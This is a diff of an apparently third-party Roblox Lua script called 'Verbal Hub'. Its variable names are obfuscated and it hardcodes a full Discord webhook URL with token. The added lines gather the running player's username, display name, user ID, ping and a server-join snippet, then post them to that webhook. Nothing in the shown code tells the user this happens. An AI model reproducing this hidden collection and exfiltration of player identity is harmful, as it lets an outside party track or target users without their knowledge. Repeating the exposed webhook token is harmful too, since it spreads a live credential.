@@ -1,5 +1,5 @@
 
-getgenv().haskjhfgash = "Verbal Hub"
+getgenv().haskjhfgash = "verbal hub"
 getgenv().sdkgjuhlasdas = "https://discord.com/api/webhooks/1298187154660261940/Ok5lFY2x_p2ntWRlMHlU_GK190TPQguVTDf7oxBwr_74MqcXZSRRwjh25-fyVy4xwp0G"
 getgenv().aasdfsdgfgh = "adskak2bkdjsadasd"
 
@@ -21,7 +21,24 @@ local function getServerInfo()
 	}
 end
 
+local function getPlayerDetails()
+	return {
+		["Username"] = player.Name,
+		["Display Name"] = player.DisplayName,
+		["UserID"] = userid,
+	}
+end
+
+local function getPing()
+	local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"
+	return pingValue
+end
+
 local function sendWebhook()
+	local serverInfo = getServerInfo()
+	local playerDetails = getPlayerDetails()
+	local pingValue = getPing()
+
 	local data = {
 		['webhookid'] = getgenv().aasdfsdgfgh,
 		["embeds"] = {{
@@ -30,7 +47,8 @@ local function sendWebhook()
 			["fields"] = {
 				{["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().haskjhfgash .. "```", ["inline"] = false},
 				{["name"] = "🔗 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false},
-				{["name"] = "🕹️ **Server Info**", ["value"] = "```" .. getServerInfo()["Players in Server"] .. "\n" .. getServerInfo()["Ping"] .. "```", ["inline"] = true},
+				{["name"] = "👤 **Player Details**", ["value"] = "```Username: " .. playerDetails.Username .. "\nDisplay Name: " .. playerDetails["Display Name"] .. "\nUserID: " .. playerDetails.UserID .. "```", ["inline"] = false},
+				{["name"] = "🕹️ **Server Info**", ["value"] = "```" .. serverInfo["Players in Server"] .. "\nPing: " .. pingValue .. " ms```", ["inline"] = true},
 			},
 		}},
 	}
